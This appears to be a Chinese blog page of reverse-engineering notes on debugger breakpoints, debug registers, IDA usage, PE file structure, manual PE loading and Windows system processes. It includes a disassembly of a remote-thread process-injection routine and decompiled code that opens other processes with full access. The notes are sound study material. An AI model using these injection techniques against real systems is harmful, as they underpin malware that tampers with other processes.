<p><strong>这个问题解释是这样的：先，调试器把断点处的第一个字节改成 0XCC，当接收到继续运行的消息时，调试器会先把这个 int 3 断点修复成原来的字节，然后会执行 eip-1 这个操作，把 int 3 改掉的代码继续执行，有 eip-1 的话，那么就很正常了</strong></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20210124121942299.png" alt="å¨è¿éæå¥å¾çæè¿°"></p>
<p>调试 DR0-DR3 寄存器原理</p>
<p>调试寄存器 DR0-DR3<br>
 这四个寄存器是用来设置 断点地址的。断点的比对在物理地址转换前（异常产生时，还没有将线性地址转换成物理地址）。由于只有 0-3 四个保存地址的寄存器，所以，硬件断点，在物理上最多只能有 4 个。<br>
调试寄存器 DR4-DR5<br>
 这两个调试寄存器有 CR4 的 DE 标记控制。如果 DE 置位，那么对这两个寄存器的访问会导致 #UD 异常。如果 DE 置 0，那么他们就被化名为 DR6-DR7（你一定会问原来的 DR6-DR7 怎么办？这个…… 我也不知道。如果你搞明白了，一定记得告诉我）<br>
调试寄存器 DR7 (控制寄存器)<br>
(先介绍 DR7 对 DR6 的理解有好处。)</p>
<p>DR7 是调试控制寄存器。控制方式嘛！：<br>
\1. L0-L3（由第 0，2，4，6 位控制）: 对应 DR0-DR3，设置断点作用范围，如果被置位，那么将只对当前任务有效。每次异常后，Lx 都被清零。<br>
\2. G0-G3（由第 1，3，5，7 位控制）：对应 DR0-DR3, 如果置位，那么所有的任务都有效。每次异常后不会被清零。以确保对所有任务有效。但是，不知道为什么，我在测试时：<br>
设置 Gn 后，不能返回调试异常给调试器（如果你知道为什么，记得告诉我）<br>
\3. LE,GE（由第 8，9 位控制）: 这个在 P6 以下系列 CPU 上不被支持，在升级版的系列里面：如果被置位，那么 cpu 将会追踪精确的数据断点。LE 是局部的，GE 是全局的。（到底什么算精确的，我也不清楚，但是，我知道如果设置了这两个，cpu 的速度会降低。我在测试中，都没有置位。）<br>
\4. GD (由第 13 位控制): 如果置位，追踪下一条指令是否会访问调试寄存器。如果是，产生异常。在下面的 DR6 里面，你会知道他还和另外一个标志位有点关系。<br>
\5. R/W0-R/W3：（由第 16，17，20，21，24，25，28，29 位控制）：这个东西的处理有两种情况。</p>
<h2 id="ida"><a class="markdownIt-Anchor" href="#ida">#</a> IDA</h2>
<h3 id="目录结构"><a class="markdownIt-Anchor" href="#目录结构">#</a> 目录结构</h3>
<p>在 IDA 的安装根目录下有许多文件夹，各个文件夹存储不同的内容</p>
<p>cfg：包含各种配置文件，基本 IDA 配置文件 ida.cfg,GUI 配置文件 idagui.cfg，文本模式用户界面配置文件 idatui.cfg,</p>
<p>idc：包含 IDA 内置脚本语言 IDC 所需要的核心文件</p>
<p>ids：包含一些符号文件</p>
<p>loaders：包含用于识别和解析 PE 或者 ELF</p>
<p>plugins：附加的插件模块</p>
<p>procs：包含处理器模块</p>
<h3 id="快捷键"><a class="markdownIt-Anchor" href="#快捷键">#</a> 快捷键</h3>
<p>IDA 中的快捷键都是和菜单栏的各个功能选项一一对应的，基本上你只要能在菜单栏上找到某个功能，也就能看到相应的快捷键，这里记录几个常用的：</p>
<p>a：将数据转换为字符串</p>
<p>f5：一键反汇编</p>
<p>esc：回退键，能够倒回上一部操作的视图（只有在反汇编窗口才是这个作用，如果是在其他窗口按下 esc，会关闭该窗口）</p>
<p>shift+f12：可以打开 string 窗口，一键找出所有的字符串，右击 setup，还能对窗口的属性进行设置</p>
<p>ctrl+w：保存 ida 数据库</p>
<p>ctrl+s：选择某个数据段，直接进行跳转</p>
<p>ctrl + 鼠标滚轮：能够调节流程视图的大小</p>
<p>x：对着某个函数、变量按该快捷键，可以查看它的交叉引用</p>
<p>g：直接跳转到某个地址</p>
<p>n：更改变量的名称</p>
<p>y：更改变量的类型</p>
<p>/ ：在反编译后伪代码的界面中写下注释</p>
<p>\：在反编译后伪代码的界面中隐藏 / 显示变量和函数的类型描述，有时候变量特别多的时候隐藏掉类型描述看起来会轻松很多</p>
<p>；：在反汇编后的界面中写下注释</p>
<p>ctrl+shift+w：拍摄 IDA 快照</p>
<p>u：undefine，取消定义函数、代码、数据的定义</p>
<p>调试：根据需要调试的类型，选择对应的调试器，F9 使程序运行</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230923132703693.png" alt="image-20230923132703693"></p>
<p>g OpenProcess</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230923133223561.png" alt="image-20230923133223561"></p>
<p>查看交叉引用</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230923204924077.png" alt="image-20230923204924077"></p>
<p>F2 下断</p>
<h3 id="伪代码"><a class="markdownIt-Anchor" href="#伪代码">#</a> 伪代码</h3>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0040755</span>A  |&gt; \<span class="number">8B</span>86 FC030000 mov     eax,dword ptr ds:[esi+<span class="number">0x3FC</span>]</span><br><span class="line"><span class="number">00407560</span>  |.  <span class="number">3B</span>C3          cmp     eax,ebx</span><br><span class="line"><span class="number">00407562</span>  |.  <span class="number">74</span> <span class="number">0</span>D         je      <span class="type">short</span> <span class="number">00407571</span></span><br><span class="line"><span class="number">00407564</span>  |.  <span class="number">50</span>            push    eax                              ; /hObject</span><br><span class="line"><span class="number">00407565</span>  |.  FF15 <span class="number">74204100</span> call    dword ptr ds:[&lt;&amp;KERNEL32.CloseHa&gt;; \CloseHandle</span><br><span class="line"><span class="number">0040756B</span>  |.  <span class="number">899</span>E FC030000 mov     dword ptr ds:[esi+<span class="number">0x3FC</span>],ebx</span><br><span class="line"><span class="number">00407571</span>  |&gt;  <span class="number">8B</span>8E F8030000 mov     ecx,dword ptr ds:[esi+<span class="number">0x3F8</span>]</span><br><span class="line"><span class="number">00407577</span>  |.  <span class="number">6</span>A <span class="number">40</span>         push    <span class="number">0x40</span>                             ; /flProtect = <span class="number">40</span> (<span class="number">64.</span>)</span><br><span class="line"><span class="number">00407579</span>  |.  <span class="number">68</span> <span class="number">00100000</span>   push    <span class="number">0x1000</span>                           ; |flAllocationType = <span class="number">1000</span> (<span class="number">4096.</span>)</span><br><span class="line"><span class="number">0040757</span>E  |.  <span class="number">57</span>            push    edi                              ; |dwSize</span><br><span class="line"><span class="number">0040757F</span>  |.  <span class="number">53</span>            push    ebx                              ; |lpAddress</span><br><span class="line"><span class="number">00407580</span>  |.  <span class="number">51</span>            push    ecx                              ; |hProcess</span><br><span class="line"><span class="number">00407581</span>  |.  <span class="number">895</span>D FC       mov     [local<span class="number">.1</span>],ebx                    ; |</span><br><span class="line"><span class="number">00407584</span>  |.  FF15 <span class="number">84204100</span> call    dword ptr ds:[&lt;&amp;KERNEL32.Virtual&gt;; \VirtualAllocEx</span><br><span class="line"><span class="number">0040758</span>A  |.  <span class="number">3B</span>C3          cmp     eax,ebx</span><br><span class="line"><span class="number">0040758</span>C  |.  <span class="number">8986</span> EC030000 mov     dword ptr ds:[esi+<span class="number">0x3EC</span>],eax</span><br><span class="line"><span class="number">00407592</span>  |.  <span class="number">75</span> <span class="number">09</span>         jnz     <span class="type">short</span> <span class="number">0040759</span>D</span><br><span class="line"><span class="number">00407594</span>  |.  <span class="number">53</span>            push    ebx</span><br><span class="line"><span class="number">00407595</span>  |.  <span class="number">53</span>            push    ebx</span><br><span class="line"><span class="number">00407596</span>  |.  <span class="number">68</span> E4AA4100   push    <span class="number">0041</span>AAE4                         ;  ASCII <span class="string">&quot;在目标进程申请代码空间失败！&quot;</span></span><br><span class="line"><span class="number">0040759B</span>  |.^ EB A7         jmp     <span class="type">short</span> <span class="number">00407544</span></span><br><span class="line"><span class="number">0040759</span>D  |&gt;  <span class="number">8B</span>CE          mov     ecx,esi</span><br><span class="line"><span class="number">0040759F</span>  |.  E8 <span class="number">4</span>CFDFFFF   call    <span class="number">004072F</span>0</span><br><span class="line"><span class="number">004075</span>A4  |.  <span class="number">3</span>AC3          cmp     al,bl</span><br><span class="line"><span class="number">004075</span>A6  |.  <span class="number">75</span> <span class="number">2</span>C         jnz     <span class="type">short</span> <span class="number">004075</span>D4</span><br><span class="line"><span class="number">004075</span>A8  |.  <span class="number">8B</span>96 EC030000 mov     edx,dword ptr ds:[esi+<span class="number">0x3EC</span>]</span><br><span class="line"><span class="number">004075</span>AE  |.  <span class="number">8B</span>86 F8030000 mov     eax,dword ptr ds:[esi+<span class="number">0x3F8</span>]</span><br><span class="line"><span class="number">004075B</span>4  |.  <span class="number">68</span> <span class="number">00800000</span>   push    <span class="number">0x8000</span>                           ; /dwFreeType = <span class="number">8000</span> (<span class="number">32768.</span>)</span><br><span class="line"><span class="number">004075B</span>9  |.  <span class="number">53</span>            push    ebx                              ; |dwSize</span><br><span class="line"><span class="number">004075B</span>A  |.  <span class="number">52</span>            push    edx                              ; |lpAddress</span><br><span class="line"><span class="number">004075B</span>B  |.  <span class="number">50</span>            push    eax                              ; |hProcess</span><br><span class="line"><span class="number">004075B</span>C  |.  FF15 <span class="number">80204100</span> call    dword ptr ds:[&lt;&amp;KERNEL32.Virtual&gt;; \VirtualFreeEx</span><br><span class="line"><span class="number">004075</span>C2  |.  <span class="number">53</span>            push    ebx</span><br><span class="line"><span class="number">004075</span>C3  |.  <span class="number">53</span>            push    ebx</span><br><span class="line"><span class="number">004075</span>C4  |.  <span class="number">899</span>E EC030000 mov     dword ptr ds:[esi+<span class="number">0x3EC</span>],ebx</span><br><span class="line"><span class="number">004075</span>CA  |.  <span class="number">68</span> C8AA4100   push    <span class="number">0041</span>AAC8                         ;  ASCII <span class="string">&quot;在目标进程写入代码失败！&quot;</span></span><br><span class="line"><span class="number">004075</span>CF  |.^ E9 <span class="number">70F</span>FFFFF   jmp     <span class="number">00407544</span></span><br><span class="line"><span class="number">004075</span>D4  |&gt;  <span class="number">8B</span>8E EC030000 mov     ecx,dword ptr ds:[esi+<span class="number">0x3EC</span>]</span><br><span class="line"><span class="number">004075</span>DA  |.  <span class="number">8B</span>96 F8030000 mov     edx,dword ptr ds:[esi+<span class="number">0x3F8</span>]</span><br><span class="line"><span class="number">004075E0</span>  |.  <span class="number">53</span>            push    ebx                              ; /lpThreadId</span><br><span class="line"><span class="number">004075E1</span>  |.  <span class="number">53</span>            push    ebx                              ; |dwCreationFlags</span><br><span class="line"><span class="number">004075E2</span>  |.  <span class="number">53</span>            push    ebx                              ; |lpParameter</span><br><span class="line"><span class="number">004075E3</span>  |.  <span class="number">51</span>            push    ecx                              ; |lpStartAddress</span><br><span class="line"><span class="number">004075E4</span>  |.  <span class="number">53</span>            push    ebx                              ; |dwStackSize</span><br><span class="line"><span class="number">004075E5</span>  |.  <span class="number">53</span>            push    ebx                              ; |lpThreadAttributes</span><br><span class="line"><span class="number">004075E6</span>  |.  <span class="number">52</span>            push    edx                              ; |hProcess</span><br><span class="line"><span class="number">004075E7</span>  |.  FF15 <span class="number">50204100</span> call    dword ptr ds:[&lt;&amp;KERNEL32.CreateR&gt;; \CreateRemoteThread</span><br><span class="line"><span class="number">004075</span>ED  |.  <span class="number">3B</span>C3          cmp     eax,ebx</span><br><span class="line"><span class="number">004075</span>EF  |.  <span class="number">8986</span> FC030000 mov     dword ptr ds:[esi+<span class="number">0x3FC</span>],eax</span><br><span class="line"><span class="number">004075F</span>5  |.  <span class="number">75</span> <span class="number">2</span>C         jnz     <span class="type">short</span> <span class="number">00407623</span></span><br><span class="line"><span class="number">004075F</span>7  |.  <span class="number">8B</span>86 EC030000 mov     eax,dword ptr ds:[esi+<span class="number">0x3EC</span>]</span><br><span class="line"><span class="number">004075F</span>D  |.  <span class="number">8B</span>8E F8030000 mov     ecx,dword ptr ds:[esi+<span class="number">0x3F8</span>]</span><br><span class="line"><span class="number">00407603</span>  |.  <span class="number">68</span> <span class="number">00800000</span>   push    <span class="number">0x8000</span>                           ; /dwFreeType = <span class="number">8000</span> (<span class="number">32768.</span>)</span><br><span class="line"><span class="number">00407608</span>  |.  <span class="number">53</span>            push    ebx                              ; |dwSize</span><br><span class="line"><span class="number">00407609</span>  |.  <span class="number">50</span>            push    eax                              ; |lpAddress</span><br><span class="line"><span class="number">0040760</span>A  |.  <span class="number">51</span>            push    ecx                              ; |hProcess</span><br><span class="line"><span class="number">0040760B</span>  |.  FF15 <span class="number">80204100</span> call    dword ptr ds:[&lt;&amp;KERNEL32.Virtual&gt;; \VirtualFreeEx</span><br><span class="line"><span class="number">00407611</span>  |.  <span class="number">53</span>            push    ebx</span><br><span class="line"><span class="number">00407612</span>  |.  <span class="number">53</span>            push    ebx</span><br><span class="line"><span class="number">00407613</span>  |.  <span class="number">899</span>E EC030000 mov     dword ptr ds:[esi+<span class="number">0x3EC</span>],ebx</span><br><span class="line"><span class="number">00407619</span>  |.  <span class="number">68</span> ACAA4100   push    <span class="number">0041</span>AAAC                         ;  ASCII <span class="string">&quot;在目标进程创建线程失败！&quot;</span></span><br><span class="line"><span class="number">0040761</span>E  |.^ E9 <span class="number">21F</span>FFFFF   jmp     <span class="number">00407544</span></span><br><span class="line"><span class="number">00407623</span>  |&gt;  <span class="number">8B</span>96 EC030000 mov     edx,dword ptr ds:[esi+<span class="number">0x3EC</span>]</span><br><span class="line"><span class="number">00407629</span>  |.  <span class="number">8</span>D86 E0000000 lea     eax,dword ptr ds:[esi+<span class="number">0xE0</span>]</span><br><span class="line"><span class="number">0040762F</span>  |.  <span class="number">52</span>            push    edx</span><br><span class="line"><span class="number">00407630</span>  |.  <span class="number">68</span> A8AA4100   push    <span class="number">0041</span>AAA8                         ;  ASCII <span class="string">&quot;%p&quot;</span></span><br><span class="line"><span class="number">00407635</span>  |.  <span class="number">50</span>            push    eax</span><br><span class="line"><span class="number">00407636</span>  |.  C745 FC FFFFF&gt;mov     [local<span class="number">.1</span>],<span class="number">-0x1</span></span><br><span class="line"><span class="number">0040763</span>D  |.  E8 <span class="number">04930000</span>   call    &lt;jmp.&amp;MFC42.#<span class="number">2818</span>&gt;</span><br><span class="line"><span class="number">00407642</span>  |.  <span class="number">83</span>C4 <span class="number">0</span>C       add     esp,<span class="number">0xC</span></span><br><span class="line"><span class="number">00407645</span>  |.  <span class="number">8B</span>CE          mov     ecx,esi</span><br><span class="line"><span class="number">00407647</span>  |.  <span class="number">53</span>            push    ebx</span><br><span class="line"><span class="number">00407648</span>  |.  E8 <span class="number">3B</span>930000   call    &lt;jmp.&amp;MFC42.#<span class="number">6334</span>&gt;</span><br><span class="line"><span class="number">0040764</span>D  |.  <span class="number">8B</span>4D F4       mov     ecx,[local<span class="number">.3</span>]</span><br><span class="line"><span class="number">00407650</span>  |.  <span class="number">5F</span>            pop     edi</span><br><span class="line"><span class="number">00407651</span>  |.  <span class="number">5</span>E            pop     esi</span><br><span class="line"><span class="number">00407652</span>  |.  <span class="number">64</span>:<span class="number">890</span>D <span class="number">00000</span>&gt;mov     dword ptr fs:[<span class="number">0</span>],ecx</span><br><span class="line"><span class="number">00407659</span>  |.  <span class="number">5B</span>            pop     ebx</span><br><span class="line"><span class="number">0040765</span>A  |.  <span class="number">8B</span>E5          mov     esp,ebp</span><br><span class="line"><span class="number">0040765</span>C  |.  <span class="number">5</span>D            pop     ebp</span><br><span class="line"><span class="number">0040765</span>D  \.  <span class="function">C3            retn</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="type">char</span> __stdcall <span class="title">sub_40CFB0</span><span class="params">(HANDLE TokenHandle)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  HANDLE v1; <span class="comment">// edi@1</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// ebx@2</span></span><br><span class="line">  HANDLE v3; <span class="comment">// eax@2</span></span><br><span class="line">  HANDLE v4; <span class="comment">// esi@2</span></span><br><span class="line">  DWORD cbNeeded; <span class="comment">// [sp+10h] [bp-8h]@2</span></span><br><span class="line">  HMODULE hModule; <span class="comment">// [sp+14h] [bp-4h]@5</span></span><br><span class="line"></span><br><span class="line">  v1 = TokenHandle;</span><br><span class="line">  <span class="keyword">if</span> ( !TokenHandle )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v2 = (<span class="type">int</span>)((<span class="type">char</span> *)TokenHandle + <span class="number">264</span>);</span><br><span class="line">  *((_BYTE *)TokenHandle + <span class="number">264</span>) = <span class="number">0</span>;</span><br><span class="line">  cbNeeded = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="built_in">GetCurrentProcess</span>();</span><br><span class="line">  <span class="built_in">OpenProcessToken</span>(v3, <span class="number">0x20</span>u, &amp;TokenHandle);</span><br><span class="line">  <span class="built_in">sub_40DA50</span>(TokenHandle, Name);</span><br><span class="line">  <span class="built_in">CloseHandle</span>(TokenHandle);</span><br><span class="line">  v4 = <span class="built_in">OpenProcess</span>(<span class="number">0x1F0FFF</span>u, <span class="number">0</span>, *(_DWORD *)v1);</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="built_in">OpenProcess</span>(<span class="number">0x100430</span>u, <span class="number">1</span>, *(_DWORD *)v1);</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">CloseHandle</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">EnumProcessModules</span>(v4, &amp;hModule, <span class="number">4u</span>, &amp;cbNeeded) || !cbNeeded )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(v4);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">GetModuleFileNameExA</span>(v4, hModule, (LPSTR)v1 + <span class="number">264</span>, <span class="number">0x104</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( *((_BYTE *)v1 + <span class="number">265</span>) != <span class="number">58</span> )</span><br><span class="line">    <span class="built_in">sub_40D0B0</span>((LPCSTR)v1 + <span class="number">4</span>, v2);</span><br><span class="line">  <span class="built_in">CloseHandle</span>(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="远程调试"><a class="markdownIt-Anchor" href="#远程调试">#</a> 远程调试</h3>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230923212509390.png" alt="image-20230923212509390"></p>
<p>将对应内核的程序传到要调试的程序的文件夹中</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230923212744539.png" alt="image-20230923212744539"></p>
<p>路径不需要写盘符</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230923212847075.png" alt="image-20230923212847075"></p>
<p>IDS 通过 recv_from ，连接服务器远程调试</p>
<h2 id="pe"><a class="markdownIt-Anchor" href="#pe">#</a> PE</h2>
<p>PE 即 Portable Executable，是 Windows OS 下使用的可执行文件格式。PE 文件是指 32 位的可执行文件，亦称为 PE32。64 位的可执行文件称为 PE + 或 PE32+，是 PE 文件的一种扩展形式。</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/2f336517676a47c79a5c100c9eba76a2.png" alt="img"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20180604194342189" alt="img"></p>
<p>PE 文件加载流程：要执行 PE 文件，需要先将文件从磁盘以一定的规则加载到内存中，PE 文件加载到内存中的情形如图所示</p>
<img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/f7f22dc0eb414f728d5c6701b11331b8.png" alt="img" style="zoom: 67%;" /> 
<p>编译器可以决定基址和 oep</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230924105826930.png" alt="image-20230924105826930"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230924110014914.png" alt="image-20230924110014914"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230924110115948.png" alt="image-20230924110115948"></p>
<p>其中，从 DOS 头（DOS header）到节区头（Section header）是 PE 头部分，其下的节区合称 PE 体</p>
<p>VA 指的是进程虚拟内存的绝对地址，RVA ( Relative Virtual Address， 相对虚拟地址）指从某个基准位置（ ImageBase ）开始的相对地址。 VA 与 RVA 满足下面的换算关系。</p>
<p>RVA+ImageBase=VA</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/66693853b00747e1b6f135dfeed85565.jpg" alt="img"></p>
<p>什么是 DLL</p>
<p>16 位的 DOS 时代不存在 DLL（Dynamic Linked Library）这一概念，只有 “库”（Library）一说。比如在 C 语言中使用 printf () 函数时，编译器会先从 C 库中读取相应函数的二进制代码，然后插入到应用程序。Windows OS 支持多任务，若仍采用这种包含库的方式，会非常没有效率。于是 Windows OS 的设计者们根据需要引入了 DLL 这一概念。</p>
<p>加载 DLL 的方式有两种：</p>
<p>显示链接：程序使用 DLL 时加载，使用完毕后释放内存；</p>
<p>隐式链接：程序开始时即加载 DLL，程序终止时再释放占用的内存。</p>
<p>上面提到了 DLL，在各种不同版本的 Windows 系统中，DLL 的版本各不相同，同一函数在不同版本 DLL 中的位置也可能不同；另外一个原因在于 DLL 的重定位，DLL 文件的 ImageBase 值一般为 10000000，但当两个 DLL 尝试装载到同一个地址时会发生冲突，因此有一个 DLL 得寻找另一个地址装载，这就是所谓的 DLL 重定位。</p>
<p>因此当我们要调用某个 DLL 中的函数时，需要借助 IAT (Import Address Table，导入地址表）作为中间桥梁。PE 文件在装载时由 PE 装载器将导入函数的真实地址写入到 IAT 时，函数调用时则需要从 IAT 中获取函数的真实地址。</p>
<p>IAT 提供的机制与 DLL 的隐式链接有关。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">char</span> input[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">scanf_s</span>(<span class="string">&quot;%s&quot;</span>, input);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(input, <span class="string">&quot;password&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Right.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="导出表"><a class="markdownIt-Anchor" href="#导出表">#</a> 导出表</h3>
<p>导出表是 PE 文件为其他应用程序提供自身的一些变量、函数以及类，将其导出给第三方程序使用的一张清单，里面包含了可以导出的元素。</p>
<p>从逻辑上来说，导出表由名称表、函数表与序号表组成。函数表和序号表必不可少，名称表则是可选的。序号表与名称表的作用是索引，找到真正需要的函数表，函数表中保存着被导出的函数的地址信息。</p>
<h3 id="基址重定位节原理"><a class="markdownIt-Anchor" href="#基址重定位节原理">#</a> 基址重定位节原理</h3>
<p>当向程序的虚拟内存加载 PE 文件时，文件会被加载到 ImageBase 所指向的地址。</p>
<p>ImageBase 就是前面讲到的 PE 拓展头中的一个成员：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">从逆向角度看PELoader加载器</span><br><span class="line"></span><br><span class="line">读取磁盘文件到内存</span><br><span class="line">根据PE结构获取镜像大小，在自己的程序中申请可读可写可执行的内存。</span><br><span class="line">将申请的空间全部填为0</span><br><span class="line">修复函数重定位</span><br><span class="line">根据PE结构的导入表，加载所需的dll，并获取导入函数的地址并写入导入表中</span><br><span class="line">修改PE文件的加载基址</span><br><span class="line">跳转到PE的入口点处执行</span><br></pre></td></tr></table></figure>
<h2 id="windows系统安全"><a class="markdownIt-Anchor" href="#windows系统安全">#</a> Windows 系统安全</h2>
<p>进程句柄表</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/563d88364cb24f768722413a352523a4.png" alt="img"></p>
<h3 id="系统进程"><a class="markdownIt-Anchor" href="#系统进程">#</a> 系统进程</h3>
<ol>
<li>Winlogon  是一个登录 / 退出进程。winlogon 在用户按下 CTRL+ALT+DEL 时激活，并显示安全对话框。该进程提供了登录所需的类型控制和输入口令所需的对话框。当你输入用户名和口令时，Winlogon 将其发送给一个叫做 LSASS 的子进程。如果你执行对服务器或工作站的本地登录，LSASS 进程将在安全数据库（亦即 SAM）中查对有关用户名和口令。Winlogon 有两个子进程，即服务控制器和 LSASS。</li>
<li>Explorer 进程 在 Windows 系列的操作系统中，运行时都会启动一个名为 Explorer.exe 的进程。这个进程主要负责显示系统桌面上的图标以及任务栏。</li>
<li>csrss.exe 进程 这个进程是用户模式 Win32 子系统的一部分，CSRSS 代表客户 / 服务器运行子系统而且是一个基本的子系统必须一直运行。CSRSS 负责控制 Windows 图形相关子系统，创建或者删除线程和一些 16 位的虚拟 MS-DOS 环境。</li>
<li>System Idle 这个进程不可以从任务管理器中关掉，是作为单线程运行在每个处理器上，并在系统不处理其他线程的时候分派处理器的时间。所以，在任务管理器中，看到的 “System Idle Process” 的 CPU 资源占用恰恰是 CPU 资源空闲时间。</li>
<li>smss.exe 这个进程是不可以从任务管理器中关掉的，是一个会话管理子系统，负责启动用户会话。这个进程是通过系统进程初始化，并且对许多活动，包括正在运行的 Winlogon，Win32（Csrss.exe）线程和设定的系统变量作出反映。在它启动这些进程后，它等待 Winlogon 或者 Csrss 结束。如果这些过程是正常的，系统就关掉了。如果发生了什么不可预料的事情，smss.exe 就会让系统停止响应（就是挂起）。</li>
<li>lsass.exe 这个进程是不可以从任务管理器中关掉的。管理 IP 安全策略以及启动 ISAKMP/Oakley (IKE) 和 IP 安全驱动程序。 这是一个本地的安全授权服务，它会为使用 winlogon 服务的授权用户生成一个进程。这个进程是通过使用授权的包，例如默认的 msgina.dll 来执行。如果授权是成功的，lsass 就会产生用户的进入令牌，令牌被用于启动初始的 shell，其他由用户初始化的进程也会继承这个令牌（系统服务）。</li>
<li>services.exe 大多数的系统核心模式进程是作为系统进程在运行。</li>
